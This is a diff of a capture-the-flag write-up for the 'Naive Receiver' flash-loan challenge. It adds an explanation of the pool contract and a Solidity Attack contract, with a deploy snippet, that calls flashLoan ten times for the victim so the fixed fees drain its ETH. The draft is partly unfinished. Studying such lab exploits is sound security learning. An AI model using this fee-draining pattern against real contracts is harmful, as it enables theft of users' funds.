@@ -156,7 +156,12 @@ The NaiveReceiverLenderPool contract is a flash loan pool that allows users to b
 
 `flashFee()` : It returns the fee that needs to be paid for a flash loan. In this case, it returns a fixed fee of 1 ETH.
 
-`flashLoan()` : 
+`flashLoan()` : It provides the flash loan functionality. It takes the borrower's address, the token to be borrowed (in this case, only ETH is supported), the amount to be borrowed, and any additional data required by the borrower.
+
+Inside the function, it first checks if the token is supported (only ETH is supported in this case). It then transfers the requested amount of ETH to the borrower's address. After that, it calls the borrower's onFlashLoan function, passing the necessary parameters. If the borrower's callback function returns the CALLBACK_SUCCESS value, it checks if the contract's balance is greater than or equal to the initial balance plus the fixed fee. If not, it reverts the transaction.
+
+
+The `receive()` function is a fallback function that allows the contract to receive ETH deposits.
 
 Overall, this contract provides a basic implementation of a flash loan provider, allowing users to borrow ETH from the contract as long as it is returned within the same transaction.
 
@@ -166,3 +171,28 @@ Challenge's message:
 Take all ETH out of the user’s contract. If possible, in a single transaction.
 
 # Suberting
+
+When we look
+
+
+```solidity
+pragma solidity ^0.8.0;
+
+import "../naive-receiver/NaiveReceiverLenderPool.sol";
+import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
+
+contract Attack {
+    constructor(address payable _pool, address payable _receiver){
+        NaiveReceiverLenderPool pool = NaiveReceiverLenderPool(_pool);
+        address ETH = pool.ETH();
+        for(uint256 i=0; i<10; i++){
+            pool.flashLoan(IERC3156FlashBorrower(_receiver), ETH, 1, "0x");
+        }
+    }
+}
+```
+
+```powershell
+const AttackFactory = await ethers.getContractFactory('Attack', deployer);
+attack = await AttackFactory.deploy(pool.address, receiver.address);
+```
